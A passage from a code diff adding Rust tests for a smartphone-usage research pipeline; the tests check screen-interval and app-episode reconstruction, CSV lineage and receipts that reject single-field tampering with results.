+                (
+                    "app.a",
+                    1_772_877_601_000_000_000,
+                    Some(1_772_877_603_000_000_000)
+                ),
+                (
+                    "app.b",
+                    1_772_877_605_000_000_000,
+                    Some(1_772_877_607_000_000_000)
+                ),
+            ]
+        );
+        let app_csv = String::from_utf8(result.app_csv_bytes.to_vec()).unwrap();
+        assert!(app_csv
+            .lines()
+            .next()
+            .unwrap()
+            .contains("screen_interval_id"));
+        assert!(app_csv
+            .lines()
+            .next()
+            .unwrap()
+            .contains("schoedel_completion"));
+        assert!(screen
+            .intervals
+            .iter()
+            .all(|interval| app_csv.contains(&interval.screen_interval_id)));
+        assert!(result.row_lineage.iter().any(|lineage| {
+            lineage.output_kind.as_str() == "app-csv"
+                && lineage.screen_interval_id().is_some()
+                && lineage.schoedel_completion().is_some()
+        }));
+        let review = String::from_utf8(result.review_summary_json_bytes.to_vec()).unwrap();
+        let visualization =
+            String::from_utf8(result.visualization_data_json_bytes.to_vec()).unwrap();
+        assert!(visualization.contains("\"protocolVersion\":\"chronicle-visualization-data/v3\""));
+        for projection in [&review, &visualization] {
+            assert!(projection.contains("foundationalProvenance"));
+            assert!(projection.contains("schoedelEpisodeBindings"));
+            assert!(episodes
+                .iter()
+                .all(|episode| projection.contains(&episode.episode_id)));
+        }
+    }
+
+    #[test]
+    fn fast_jcs_matches_serde_jcs_on_a_whole_pipeline_result() {
+        let options = schoedel_options();
+        let result = run_pipeline_v2_with_supports(
+            SCHOEDEL_PIPELINE_RAW,
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("validated Schoedel baseline");
+        let preflight = &result.b05_schoedel_preflight;
+        assert!(preflight.screen_construction.is_some());
+        assert!(preflight.schoedel_reconstruction.is_some());
+        assert!(!result.row_lineage.is_empty());
+        assert_eq!(
+            crate::jcs::to_vec(&result).unwrap(),
+            serde_jcs::to_vec(&result).unwrap()
+        );
+        let receipt = validated_b05_schoedel_receipt(
+            &result,
+            &options,
+            &sha256_wire(SCHOEDEL_PIPELINE_RAW),
+            &preflight.options_digest,
+            preflight.options_digest_origin,
+        )
+        .expect("validated receipt");
+        assert_eq!(
+            receipt.screen_construction_output_jcs_digest.as_deref(),
+            Some(sha256_wire(&serde_jcs::to_vec(&preflight.screen_construction).unwrap()).as_str())
+        );
+        assert_eq!(
+            receipt.finalized_preflight_jcs_digest,
+            sha256_wire(&serde_jcs::to_vec(preflight).unwrap())
+        );
+    }
+
+    #[test]
+    fn live_b05_validation_marker_closes_preflight_and_lineage_tampering() {
+        let options = schoedel_options();
+        let baseline = run_pipeline_v2_with_supports(
+            SCHOEDEL_PIPELINE_RAW,
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("validated Schoedel baseline");
+        let raw_digest = sha256_wire(SCHOEDEL_PIPELINE_RAW);
+        let expected_options_digest = baseline.b05_schoedel_preflight.options_digest.clone();
+        let expected_options_origin = baseline.b05_schoedel_preflight.options_digest_origin;
+        let receipt = validated_b05_schoedel_receipt(
+            &baseline,
+            &options,
+            &raw_digest,
+            &expected_options_digest,
+            expected_options_origin,
+        )
+        .expect("live result returns validated receipt");
+        assert_eq!(
+            receipt.status,
+            B05SchoedelValidationStatus::ScreenAndSchoedelValidated
+        );
+        let receipt_json = serde_json::to_string(&receipt).unwrap();
+        assert!(!receipt_json.contains("P01"));
+        let forbidden_stable_participant_scope_digest = sha256_jcs(
+            &serde_json::json!({
+                "domain": "chronicle-schoedel-decisive-participant-scope/v1",
+                "participantIds": ["P01"],
+            }),
+            "test forbidden deterministic participant scope",
+        )
+        .unwrap();
+        assert!(!receipt_json.contains(&forbidden_stable_participant_scope_digest));
+        assert_eq!(
+            receipt.finalized_preflight_jcs_digest,
+            sha256_jcs(&baseline.b05_schoedel_preflight, "test finalized preflight").unwrap()
+        );
+
+        for field in [
+            "protocol",
+            "router",
+            "screen_component",
+            "schoedel_component",
+            "options_digest",
+            "options_origin",
+            "episode_id",
+            "screen_options",
+            "lineage_count",
+        ] {
+            let mut tampered = baseline.clone();
+            match field {
+                "protocol" => {
+                    tampered.b05_schoedel_preflight.protocol_version = "tampered/v1".into()
+                }
+                "router" => {
+                    tampered.b05_schoedel_preflight.component_options_digest = sha256_wire(b"x")
+                }
+                "screen_component" => {
+                    tampered
+                        .b05_schoedel_preflight
+                        .screen_component_options_digest = sha256_wire(b"x")
+                }
+                "schoedel_component" => {
+                    tampered
+                        .b05_schoedel_preflight
+                        .schoedel_component_options_digest = sha256_wire(b"x")
+                }
+                "options_digest" => {
+                    tampered.b05_schoedel_preflight.options_digest = sha256_wire(b"foreign")
+                }
+                "options_origin" => {
+                    tampered.b05_schoedel_preflight.options_digest_origin =
+                        B05OptionsDigestOrigin::VerifiedRequestJcs
+                }
+                "episode_id" => {
+                    tampered
+                        .b05_schoedel_preflight
+                        .requested_episode_strategy_id = "foreign_episode".into()
+                }
+                "screen_options" => {
+                    let screen = tampered
+                        .b05_schoedel_preflight
+                        .screen_construction
+                        .as_mut()
+                        .unwrap();
+                    *screen = b05::rebind_screen_construction_options_digest(
+                        screen,
+                        &sha256_wire(b"foreign screen options"),
+                    );
+                }
+                "lineage_count" => {
+                    tampered.row_lineage = Arc::new((*tampered.row_lineage).clone());
+                    Arc::make_mut(&mut tampered.row_lineage)[0].source_data_row_count += 1;
+                }
+                _ => unreachable!(),
+            }
+            assert!(
+                validated_b05_schoedel_receipt(
+                    &tampered,
+                    &options,
+                    &raw_digest,
+                    &expected_options_digest,
+                    expected_options_origin,
+                )
+                .is_err(),
+                "accepted one-field tamper {field}",
+            );
+        }
+
+        assert!(validated_b05_schoedel_receipt(
+            &baseline,
+            &options,
+            &raw_digest,
+            &sha256_wire(b"foreign but valid options digest"),
+            expected_options_origin,
+        )
+        .is_err());
+
+        let mut foundational_tamper = baseline.clone();
+        foundational_tamper
+            .foundational_semantics_evidence
+            .minimum_duration
+            .qualifying_count += 1;
+        assert!(validated_b05_schoedel_receipt(
+            &foundational_tamper,
+            &options,
+            &raw_digest,
+            &expected_options_digest,
+            expected_options_origin,
+        )
+        .is_err());
+
+        let mut coherently_rehashed = baseline.clone();
+        let removed = coherently_rehashed
+            .foundational_semantics_evidence
+            .minimum_duration_excluded_episodes
+            .pop()
+            .expect("baseline includes minimum-duration exclusion lineage");
+        let minimum = &mut coherently_rehashed
+            .foundational_semantics_evidence
+            .minimum_duration;
+        minimum.qualifying_count -= 1;
+        minimum.retained_excluded_count -= 1;
+        minimum.retained_credited_count += 1;
+        minimum.excluded_lineage_digest = sha256_wire(
+            &serde_json::to_vec(
+                &coherently_rehashed
+                    .foundational_semantics_evidence
+                    .minimum_duration_excluded_episodes,
+            )
+            .unwrap(),
+        );
+        assert!(
+            validate_foundational_semantics_evidence_for_options(
+                &coherently_rehashed.foundational_semantics_evidence,
+                &options,
+            )
+            .is_ok(),
+            "coherent alternate evidence remains shape-valid"
+        );
+        assert!(
+            validated_b05_schoedel_receipt(
+                &coherently_rehashed,
+                &options,
+                &raw_digest,
+                &expected_options_digest,
+                expected_options_origin,
+            )
+            .is_err(),
+            "producer-bound foundational digest rejects coherent alternate counts/lineage"
+        );
+        drop(removed);
+
+        let encoded = serde_json::to_vec(&baseline).unwrap();
+        let round_tripped: PipelineV2Result = serde_json::from_slice(&encoded).unwrap();
+        assert_eq!(
+            validated_b05_schoedel_receipt(
+                &round_tripped,
+                &options,
+                &raw_digest,
+                &expected_options_digest,
+                expected_options_origin,
+            ),
+            Err("b05_schoedel_validation_error:unvalidated_result_sentinel".into()),
+        );
+    }
+
+    #[test]
+    fn standalone_validation_receipt_rejects_coherently_rehashed_out_of_bounds_lineage() {
+        let options = schoedel_options();
+        let baseline = run_pipeline_v2_with_supports(
+            SCHOEDEL_PIPELINE_RAW,
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("B04 lineage baseline");
+        let mut evidence = baseline.foundational_semantics_evidence.clone();
+        let decoded_bound = baseline
+            .b05_schoedel_validation_context
+            .receipt
+            .decoded_input_row_count as u32;
+        evidence.minimum_duration_excluded_episodes[0].source_data_row_ranges[0].last =
+            decoded_bound + 1;
+        evidence.minimum_duration.excluded_lineage_digest =
+            sha256_wire(&serde_json::to_vec(&evidence.minimum_duration_excluded_episodes).unwrap());
+        let mut receipt = baseline.b05_schoedel_validation_context.receipt.clone();
+        receipt.foundational_semantics_evidence_jcs_digest =
+            sha256_jcs(&evidence, "tampered B04 evidence").unwrap();
+        receipt.validation_digest = b05_schoedel_validation_digest(&receipt).unwrap();
+        assert!(validate_b05_schoedel_validation_receipt_integrity(
+            &receipt,
+            &baseline.b05_schoedel_preflight,
+            &evidence,
+            &options,
+        )
+        .is_err());
+
+        let zero_raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Target Child,App A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Target Child,App A,Activity Paused,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:00:02,UTC\n",
+        );
+        let mut zero_options = test_options();
+        zero_options.correct_duplicate_event_timestamps = false;
+        zero_options.minimum_usage_duration = 0.0;
+        zero_options.minimum_duration_disposition = MinimumDurationDisposition::RetainAndCredit;
+        zero_options.filter_zero_duration_sessions = true;
+        let zero = run_pipeline_v2_with_supports(
+            zero_raw.as_bytes(),
+            &zero_options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("zero cleanup lineage baseline");
+        let mut evidence = zero.foundational_semantics_evidence.clone();
+        assert!(!evidence.zero_duration_cleanup.removed_rows.is_empty());
+        let decoded_bound = zero
+            .b05_schoedel_validation_context
+            .receipt
+            .decoded_input_row_count as u32;
+        evidence.zero_duration_cleanup.removed_rows[0].source_data_row_ranges[0].last =
+            decoded_bound + 1;
+        evidence
+            .zero_duration_cleanup
+            .receipt
+            .removed_lineage_digest =
+            sha256_wire(&serde_json::to_vec(&evidence.zero_duration_cleanup.removed_rows).unwrap());
+        let mut receipt = zero.b05_schoedel_validation_context.receipt.clone();
+        receipt.foundational_semantics_evidence_jcs_digest =
+            sha256_jcs(&evidence, "tampered zero cleanup evidence").unwrap();
+        receipt.validation_digest = b05_schoedel_validation_digest(&receipt).unwrap();
+        assert!(validate_b05_schoedel_validation_receipt_integrity(
+            &receipt,
+            &zero.b05_schoedel_preflight,
+            &evidence,
+            &zero_options,
+        )
+        .is_err());
+    }
+
+    #[test]
+    fn source_b05_screen_csv_exposes_complete_interval_lineage() {
+        let options = source_screen_options();
+        let sidecar = b05_capable_sidecar(
+            B05_IDENTITY_TEST_RAW,
+            options.screen_session_construction_strategy,
+        );
+        let result = run_pipeline_v2_with_supports(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            PipelineV2SupportFiles {
+                input_capability_evidence_csv: &sidecar,
+                ..PipelineV2SupportFiles::default()
+            },
+        )
+        .expect("source B05 screen run");
+        let csv = String::from_utf8(result.screen_csv_bytes.to_vec()).unwrap();
+        let header = csv.lines().next().unwrap();
+        for column in [
+            "screen_interval_id",
+            "screen_session_construction_strategy",
+            "screen_interval_kind",
+            "screen_start_boundary_source_row",
+            "screen_stop_boundary_source_row",
+            "screen_start_source_rows",
+            "screen_stop_source_rows",
+            "screen_interval_close_reason",
+            "screen_interval_left_censored",
+            "screen_interval_right_censored",
+        ] {
+            assert!(
+                header.split(',').any(|candidate| candidate == column),
+                "{column}"
+            );
+        }
+        let screen = result.b05_schoedel_preflight.screen_construction.unwrap();
+        assert_eq!(
+            result.b05_schoedel_preflight.screen_construction_phase,
+            B05ComputationPhase::Finalized
+        );
+        assert_eq!(
+            screen.applicability.input_digest,
+            sha256_wire(B05_IDENTITY_TEST_RAW)
+        );
+        assert!(screen
+            .intervals
+            .iter()
+            .all(|interval| csv.contains(&interval.screen_interval_id)));
+        let header_columns = header.split(',').map(str::to_owned).collect::<Vec<_>>();
+        assert_eq!(
+            header_columns,
+            declared_screen_output_columns_for_strategy(
+                options.screen_session_construction_strategy
+            )
+        );
+        let timezone_index = header_columns
+            .iter()
+            .position(|column| column == "timezone")
+            .expect("timezone column");
+        let first_row = csv.lines().nth(1).expect("one screen interval");
+        assert_eq!(
+            first_row.split(',').nth(timezone_index),
+            Some("America/Chicago"),
+            "source-B05 rows use the selected output timezone",
+        );
+        assert!(result.row_lineage.iter().all(|lineage| {
+            lineage.output_kind.as_str() != "screen-csv"
+                || (lineage.screen_interval_id().is_some()
+                    && lineage.screen_construction_strategy_id()
+                        == Some("parry_toth_2025_session_glance_v1")
+                    && lineage.screen_interval_kind().is_some()
+                    && lineage.screen_interval_close_reason().is_some())
+        }));
+        let review = String::from_utf8(result.review_summary_json_bytes.to_vec()).unwrap();
+        let visualization =
+            String::from_utf8(result.visualization_data_json_bytes.to_vec()).unwrap();
+        assert!(visualization.contains("\"protocolVersion\":\"chronicle-visualization-data/v3\""));
+        for projection in [&review, &visualization] {
+            assert!(projection.contains("foundationalProvenance"));
+            assert!(screen
+                .intervals
+                .iter()
+                .all(|interval| projection.contains(&interval.screen_interval_id)));
+        }
+    }
+
+    #[test]
+    fn source_b05_maximum_duration_exclusion_keeps_policy_neutral_provenance() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Target Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Target Child,,Keyguard Shown,android,2026-03-07 11:01:00,UTC\n",
+            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 11:01:01,UTC\n",
+            "Study,P02,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P02,Target Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
+            "Study,P02,Target Child,,Keyguard Shown,android,2026-03-07 10:00:29,UTC\n",
+            "Study,P02,Target Child,,Screen Non-Interactive,android,2026-03-07 10:00:30,UTC\n",
+        )
+        .as_bytes();
+        let mut options = source_screen_options();
+        options.screen_session_maximum_duration_minutes = 60.0;
+        options.screen_session_maximum_duration_disposition =
+            ScreenSessionMaximumDurationDisposition::ExcludeParticipant;
+        let sidecar = b05_capable_sidecar_for_participants(
+            raw,
+            options.screen_session_construction_strategy,
+            &["P01", "P02"],
+        );
+        let result = run_pipeline_v2_with_supports(
+            raw,
+            &options,
+            PipelineV2SupportFiles {
+                input_capability_evidence_csv: &sidecar,
+                ..PipelineV2SupportFiles::default()
+            },
+        )
+        .expect("source B05 participant exclusion");
+        assert_eq!(result.processed_row_count, 4);
+        #[cfg(feature = "incremental-v2")]
+        {
+            let mut engine = IncrementalPipelineV2Engine::default();
+            let tracked = engine
+                .execute(
+                    raw,
+                    &options,
+                    PipelineV2SupportFiles {
+                        input_capability_evidence_csv: &sidecar,
+                        ..PipelineV2SupportFiles::default()
+                    },
+                )
+                .expect("tracked source B05 participant exclusion");
+            assert_eq!(
+                tracked.result.processed_row_count,
+                result.processed_row_count
+            );
+            assert_eq!(tracked.result.app_csv_bytes, result.app_csv_bytes);
+            assert_eq!(tracked.result.screen_csv_bytes, result.screen_csv_bytes);
+        }
+
+        let screen = result
+            .b05_schoedel_preflight
+            .screen_construction
+            .as_ref()
+            .expect("policy-neutral B05 construction");
+        assert_eq!(screen.intervals.len(), 2);
+        assert_eq!(result.screen_row_count, 1);
+        let retained = screen
+            .intervals
+            .iter()
+            .find(|interval| interval.participant_id == "P02")
+            .expect("retained interval");
+        let excluded = screen
+            .intervals
+            .iter()
+            .find(|interval| interval.participant_id == "P01")
+            .expect("excluded interval");
+        let csv = String::from_utf8(result.screen_csv_bytes.into_vec().unwrap()).unwrap();
+        assert!(csv.contains(&retained.screen_interval_id));
+        assert!(!csv.contains(&excluded.screen_interval_id));
+        let screen_lineage = result
+            .row_lineage
+            .iter()
+            .filter(|lineage| lineage.output_kind.as_str() == "screen-csv")
+            .collect::<Vec<_>>();
+        assert_eq!(screen_lineage.len(), 1);
+        assert_eq!(
+            screen_lineage[0].screen_interval_id(),
+            Some(retained.screen_interval_id.as_str())
+        );
+        let review = String::from_utf8(result.review_summary_json_bytes.into_vec().unwrap()).unwrap();
+        assert!(review.contains(&retained.screen_interval_id));
+        assert!(review.contains(&excluded.screen_interval_id));
+    }
+
+    #[test]
+    fn default_screen_selection_keeps_product_bytes_but_records_relation() {
+        let mut omitted = test_options();
+        omitted.usage_session_mode = UsageSessionMode::ScreenUsage;
+        omitted.include_app_output = false;
+        omitted.include_screen_output = true;
+        let mut explicit = omitted.clone();
+        explicit.screen_session_construction_strategy_explicit = true;
+
+        let omitted_result = run_pipeline_v2_with_supports(
+            B05_IDENTITY_TEST_RAW,
+            &omitted,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("omitted Chronicle baseline");
+        let explicit_result = run_pipeline_v2_with_supports(
+            B05_IDENTITY_TEST_RAW,
+            &explicit,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("explicit Chronicle baseline");
+        assert_eq!(
+            omitted_result.screen_csv_bytes,
+            explicit_result.screen_csv_bytes
+        );
+        assert_eq!(
+            omitted_result.review_summary_json_bytes,
+            explicit_result.review_summary_json_bytes,
+        );
+        assert_eq!(
+            omitted_result.visualization_data_json_bytes,
+            explicit_result.visualization_data_json_bytes,
+        );
+        assert!(
+            String::from_utf8(omitted_result.visualization_data_json_bytes.to_vec())
+                .unwrap()
+                .contains("\"protocolVersion\":\"chronicle-visualization-data/v2\"")
+        );
+        assert_eq!(
+            omitted_result
+                .b05_schoedel_preflight
+                .screen_construction
+                .as_ref()
+                .unwrap()
+                .applicability
+                .relation,
+            b05::ScientificRelation::BaselineNative,
+        );
+        assert_eq!(
+            explicit_result
+                .b05_schoedel_preflight
+                .screen_construction
+                .as_ref()
+                .unwrap()
+                .applicability
+                .relation,
+            b05::ScientificRelation::BaselineEquivalent,
+        );
+    }
+
+    #[test]
+    fn finalized_chronicle_receipt_commits_exact_physical_csv_bytes() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:01:00,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:01:00,UTC\n",
+        )
+        .as_bytes();
+        let mut options = test_options();
+        options.usage_session_mode = UsageSessionMode::ScreenUsage;
+        options.include_app_output = false;
+        options.include_screen_output = true;
+        let result =
+            run_pipeline_v2_with_supports(raw, &options, PipelineV2SupportFiles::default())
+                .expect("Chronicle baseline");
+        assert_eq!(
+            result
+                .b05_schoedel_preflight
+                .screen_construction
+                .unwrap()
+                .applicability
+                .input_digest,
+            sha256_wire(raw),
+        );
+    }
+
+    #[test]
+    fn schoedel_right_censor_is_unbounded_evidence_without_headline_credit() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,A,Activity Paused,app.a,2026-03-07 10:00:09,UTC\n",
+        )
+        .as_bytes();
+        let mut options = schoedel_options();
+        options.include_app_usage_end_reason = true;
+        options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
+        options.micro_use_classification_policy_explicit = true;
+        options.minimum_usage_duration = 5.0;
+        options.minimum_usage_duration_explicit = true;
+        let result =
+            run_pipeline_v2_with_supports(raw, &options, PipelineV2SupportFiles::default())
+                .expect("right-censored evidence run");
+        let reconstruction = result
+            .b05_schoedel_preflight
+            .schoedel_reconstruction
+            .as_ref()
+            .unwrap();
+        assert_eq!(reconstruction.episodes.len(), 1);
+        let episode = &reconstruction.episodes[0];
+        assert_eq!(
+            episode.completion,
+            b05::SchoedelCompletion::RightCensoredScreenInterval
+        );
+        assert_eq!((episode.stop_ns, episode.raw_duration_ns), (None, None));
+        assert!(!episode.bounded_headline_candidate);
+        assert_eq!(result.app_row_count, 1);
+        assert_eq!(
+            result
+                .foundational_semantics_evidence
+                .micro_use
+                .class_counts,
+            BTreeMap::from([("not_classifiable".into(), 1)]),
+        );
+        assert_eq!(
+            result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .unbounded_episode_count,
+            1
+        );
+        assert_eq!(
+            result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .qualifying_count,
+            0,
+        );
+        let csv = String::from_utf8(result.app_csv_bytes.to_vec()).unwrap();
+        assert!(csv.contains("End of Usage Missing"));
+        assert!(csv.contains("right_censored_screen_interval"));
+        let mut lines = csv.lines();
+        let header = lines
+            .next()
+            .expect("right-censored Schoedel CSV header")
+            .split(',')
+            .collect::<Vec<_>>();
+        let completion_index = header
+            .iter()
+            .position(|column| *column == "schoedel_completion")
+            .expect("Schoedel completion column");
+        let end_reason_index = header
+            .iter()
+            .position(|column| *column == "app_usage_end_reason")
+            .expect("app end-reason column");
+        let micro_index = header
+            .iter()
+            .position(|column| *column == "micro_use_classification")
+            .expect("B03 classification column");
+        let right_censored = lines
+            .map(|line| line.split(',').collect::<Vec<_>>())
+            .find(|fields| {
+                fields.get(completion_index).copied() == Some("right_censored_screen_interval")
+            })
+            .expect("right-censored evidence row");
+        assert_eq!(
+            right_censored.get(end_reason_index).copied(),
+            Some("right_censored_screen_interval"),
+        );
+        assert_eq!(
+            right_censored.get(micro_index).copied(),
+            Some("not_classifiable"),
+        );
+        let review: serde_json::Value =
+            serde_json::from_slice(&result.review_summary_json_bytes.to_vec()).unwrap();
+        assert!(review["participants"]
+            .as_array()
+            .expect("review participants")
+            .iter()
+            .all(|participant| participant["totals"]["appSessionCount"] == 0));
+        assert_eq!(
+            review["microUseReceipt"],
+            serde_json::to_value(&result.foundational_semantics_evidence.micro_use).unwrap(),
+        );
+        assert!(result.row_lineage.iter().any(|lineage| {
+            lineage.schoedel_completion() == Some("right_censored_screen_interval")
+        }));
+    }
+
+    #[test]
+    fn schoedel_reads_b01_retained_app_stream_but_b05_keeps_raw_screen_stream() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,A,User Interaction,app.a,2026-03-07 10:00:04,UTC\n",
+            "Study,P01,Child,B,Activity Resumed,app.b,2026-03-07 10:00:05,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:08,UTC\n",
+        )
+        .as_bytes();
+        let none = run_pipeline_v2_with_supports(
+            raw,
+            &schoedel_options(),
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("unfiltered app evidence");
+        let mut foreground_only = schoedel_options();
+        foreground_only.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
+        let retained =
+            run_pipeline_v2_with_supports(raw, &foreground_only, PipelineV2SupportFiles::default())
+                .expect("B01-filtered app evidence");
+        let none_episodes = &none
+            .b05_schoedel_preflight
+            .schoedel_reconstruction
+            .as_ref()
+            .unwrap()
+            .episodes;
+        let retained_episodes = &retained
+            .b05_schoedel_preflight
+            .schoedel_reconstruction
+            .as_ref()
+            .unwrap()
+            .episodes;
+        assert_eq!(none_episodes[0].stop_source_row, Some(3));
+        assert_eq!(retained_episodes[0].stop_source_row, Some(2));
+        assert_eq!(
+            none_episodes[0].screen_interval_id, retained_episodes[0].screen_interval_id,
+            "B01 must not alter the raw B05 screen interval",
+        );
+    }
+
+    #[test]
+    fn schoedel_strategy_defined_opener_is_type_one_and_gesis_is_controlled_derivative() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,A,Standby Bucket Changed,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,A,Activity Paused,app.a,2026-03-07 10:00:02,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:03,UTC\n",
+        )
+        .as_bytes();
+        let native = run_pipeline_v2_with_supports(
+            raw,
+            &schoedel_options(),
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("native type-one opener set");
+        assert!(native
+            .b05_schoedel_preflight
+            .schoedel_reconstruction
+            .as_ref()
+            .unwrap()
+            .episodes
+            .is_empty());
+
+        let mut gesis = schoedel_options();
+        gesis.opener_set = OpenerSet::GesisAppScopedStarts;
+        let derivative =
+            run_pipeline_v2_with_supports(raw, &gesis, PipelineV2SupportFiles::default())
+                .expect("explicit GESIS opener derivative");
+        assert_eq!(
+            derivative
+                .b05_schoedel_preflight
+                .schoedel_reconstruction
+                .as_ref()
+                .unwrap()
+                .episodes
+                .len(),
+            1,
+        );
+        assert_eq!(
+            derivative.opener_set_evidence.applicability.relation,
+            OpenerStrategyRelation::ControlledDerivative,
+        );
+    }
+
+    #[test]
+    fn schoedel_uses_raw_equal_time_membership_despite_canonical_correction() {
+        let make_raw = |app_before_stop: bool| {
+            let middle = if app_before_stop {
+                concat!(
+                    "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+                    "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:01,UTC\n",
+                )
+            } else {
+                concat!(
+                    "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:01,UTC\n",
+                    "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+                )
+            };
+            format!(
+                "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\nStudy,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n{middle}"
+            )
+            .into_bytes()
+        };
+        for correction in [false, true] {
+            for (app_before_stop, expected_episodes) in [(true, 1), (false, 0)] {
+                let raw = make_raw(app_before_stop);
+                let mut options = schoedel_options();
+                options.correct_duplicate_event_timestamps = correction;
+                options.screen_session_construction_strategy =
+                    ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
+                options.screen_session_construction_strategy_explicit = true;
+                let sidecar =
+                    b05_capable_sidecar(&raw, options.screen_session_construction_strategy);
+                let result = run_pipeline_v2_with_supports(
+                    &raw,
+                    &options,
+                    PipelineV2SupportFiles {
+                        input_capability_evidence_csv: &sidecar,
+                        ..PipelineV2SupportFiles::default()
+                    },
+                )
+                .expect("source B05 Schoedel crossing");
+                assert_eq!(
+                    result
+                        .b05_schoedel_preflight
+                        .schoedel_reconstruction
+                        .as_ref()
+                        .unwrap()
+                        .episodes
+                        .len(),
+                    expected_episodes,
+                    "correction={correction} app_before_stop={app_before_stop}",
+                );
+                #[cfg(feature = "incremental-v2")]
+                {
+                    let mut engine = IncrementalPipelineV2Engine::default();
+                    let tracked = engine
+                        .execute(
+                            &raw,
+                            &options,
+                            PipelineV2SupportFiles {
+                                input_capability_evidence_csv: &sidecar,
+                                ..PipelineV2SupportFiles::default()
+                            },
+                        )
+                        .expect("tracked source B05 Schoedel crossing");
+                    assert_eq!(
+                        tracked.result.b05_schoedel_preflight,
+                        result.b05_schoedel_preflight
+                    );
+                    assert_eq!(tracked.result.app_csv_bytes, result.app_csv_bytes);
+                    assert_eq!(tracked.result.row_lineage, result.row_lineage);
+
+                    let unknown_sidecar = String::from_utf8(sidecar.clone()).unwrap().replace(
+                        "equal_timestamp_source_order_preserved,capable,study_protocol,fixture,",
+                        "equal_timestamp_source_order_preserved,unknown,unspecified,,",
+                    );
+                    let unknown_support = PipelineV2SupportFiles {
+                        input_capability_evidence_csv: unknown_sidecar.as_bytes(),
+                        ..PipelineV2SupportFiles::default()
+                    };
+                    let refused = engine
+                        .preflight_b05_schoedel(&raw, &options, unknown_support)
+                        .expect("unknown raw source-order evidence is a typed refusal");
+                    assert_eq!(
+                        refused
+                            .schoedel_reconstruction
+                            .as_ref()
+                            .unwrap()
+                            .applicability
+                            .refusal_reason,
+                        Some(b05::SchoedelRefusalReason::AmbiguousEqualTimestamp),
+                        "correction={correction} app_before_stop={app_before_stop}",
+                    );
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn schoedel_deduplicates_logical_opener_once_but_keeps_physical_lineage() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,A,Activity Paused,app.a,2026-03-07 10:00:02,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:03,UTC\n",
+        )
+        .as_bytes();
+        let result = run_pipeline_v2_with_supports(
+            raw,
+            &schoedel_options(),
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("deduplicated Schoedel episode");
+        let episodes = &result
+            .b05_schoedel_preflight
+            .schoedel_reconstruction
+            .as_ref()
+            .unwrap()
+            .episodes;
+        assert_eq!(episodes.len(), 1);
+        assert_eq!(episodes[0].source_rows, vec![2, 3, 4]);
+        assert_eq!(result.exact_duplicate_rows_removed, 1);
+    }
+
+    #[test]
+    fn all_screen_strategy_headers_match_their_declared_contract() {
